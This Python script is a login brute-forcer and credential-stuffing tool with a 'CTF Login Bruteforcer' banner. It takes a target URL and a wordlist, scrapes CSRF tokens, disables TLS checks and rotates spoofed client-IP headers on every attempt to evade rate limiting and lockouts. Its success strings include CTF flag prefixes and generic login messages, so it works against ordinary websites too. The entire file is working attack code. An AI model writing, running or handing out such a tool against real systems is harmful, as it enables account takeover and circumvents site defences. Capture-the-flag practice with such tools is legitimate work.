import requests
import random
import time
from bs4 import BeautifulSoup
from termcolor import colored

text = colored(r"""

  ___ _____ ___   _              _
 / __|_   _| __| | |   ___  __ _(_)_ _
| (__  | | | _|  | |__/ _ \/ _` | | ' \
 \___| |_| |_|   |____\___/\__, |_|_||_|
                           |___/
 ___          _        __
| _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___ _ _
| _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_) '_|
|___/_|  \_,_|\__\___|_| \___/_| \__\___|_|


""", "red", attrs=["bold"])

print(text)

# Banner already printed above

# Configuration flags
success_strings = ["flag{", "H4G{", "H5G{", "Welcome", "Logged in", "pico", "picoCTF", "picoCTF{"]

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def detect_protocol(url):
    if not url: return None
    if url.startswith(("http://", "https://")):
        return url

    print(colored("\n[*] Detecting protocol...", "yellow", attrs=["bold"]))
    
    for proto in ["https://", "http://"]:
        try:
            full_url = f"{proto}{url}"
            if requests.get(full_url, timeout=3, verify=False).status_code < 500:
                return full_url
        except requests.RequestException:
            pass
    return None

def get_input(prompt_text, default=None):
    prompt_colored = colored(f"[+] {prompt_text}", "blue", attrs=["bold"])
    if default:
        prompt_colored += colored(f" (default: {default})", "white")
    prompt_colored += ": "
        
    val = input(prompt_colored).strip()
    return val if val else default

def send_attempt(session, url, headers, payload):
    try:
        # Initial GET to capture cookies and potentially CSRF tokens
        res = session.get(url, headers=headers, timeout=5, verify=False)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        # Scrape hidden tokens (CSRF)
        for hidden in soup.find_all("input", type="hidden"):
            name = hidden.get("name")
            value = hidden.get("value")
            if name:
                payload[name] = value
        
        # Submit the login form
        return session.post(url, data=payload, headers=headers, timeout=5, verify=False)
    except Exception as e:
        return None

def main():
    target_url = get_input("Enter Target URL")
    if not target_url: return

    print(colored("\nModes:\n1. Brute Force (Single Username)\n2. Credential Stuffing (Username : Password)\n", "cyan"))
    mode = get_input("Select Mode", default="1")
    
    username = None
    if mode == "1":
        username = get_input("Enter Target Username")
    
    wordlist_path = get_input("Enter Wordlist Path")
    if not wordlist_path: return

    delay = get_input("Delay between attempts (seconds)", default="0.1")
    try:
        delay = float(delay)
    except ValueError:
        delay = 0.1

    field_user = get_input("HTML User Field Name", default="username")
    field_pass = get_input("HTML Pass Field Name", default="password")

    target_url = detect_protocol(target_url)
    if not target_url:
        print(colored("\n[!] Error: Target unreachable.", "red", attrs=["bold"]))
        return

    print(colored(f"\n[*] Starting Attack on {target_url}", "green", attrs=["bold"]))
    print(colored(f"[*] Mode: {'Brute Force' if mode == '1' else 'Credential Stuffing'}", "green"))
    print(colored(f"[*] Spoofing IP headers for every request...", "yellow"))

    s = requests.Session()
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Referer": target_url
    }

    try:
        requests.packages.urllib3.disable_warnings()
        with open(wordlist_path, "r", encoding="latin-1") as f:
            for line in f:
                line = line.strip()
                if not line: continue

                if mode == "1":
                    curr_user = username
                    curr_pass = line
                else:
                    if ":" in line:
                        curr_user, curr_pass = line.split(":", 1)
                    elif ";" in line:
                        curr_user, curr_pass = line.split(";", 1)
                    else:
                        continue

                # Enhanced IP Spoofing
                spoof_ip = random_ip()
                headers = base_headers.copy()
                headers.update({
                    "X-Forwarded-For": spoof_ip,
                    "X-Client-IP": spoof_ip,
                    "X-Real-IP": spoof_ip,
                    "True-Client-IP": spoof_ip,
                    "CF-Connecting-IP": spoof_ip,
                    "Client-IP": spoof_ip,
                    "Forwarded": f"for={spoof_ip};proto=http"
                })

                payload = {field_user: curr_user, field_pass: curr_pass}
                
                print(f"\r{colored('[*]', 'cyan')} Trying {curr_user}:{curr_pass:<20} | IP: {spoof_ip:<15}", end="")
                
                resp = send_attempt(s, target_url, headers, payload)
                
                if resp and any(ind in resp.text for ind in success_strings):
                    print(f"\n\n{colored('[+] SUCCESS!', 'green', attrs=['bold'])} Found: {curr_user}:{curr_pass}")
                    return

                time.sleep(delay)

    except FileNotFoundError:
        print(colored(f"\n[!] Error: Wordlist '{wordlist_path}' not found.", "red"))
    except KeyboardInterrupt:
        print(colored("\n\n[!] Aborted.", "red"))

if __name__ == "__main__":
    main()
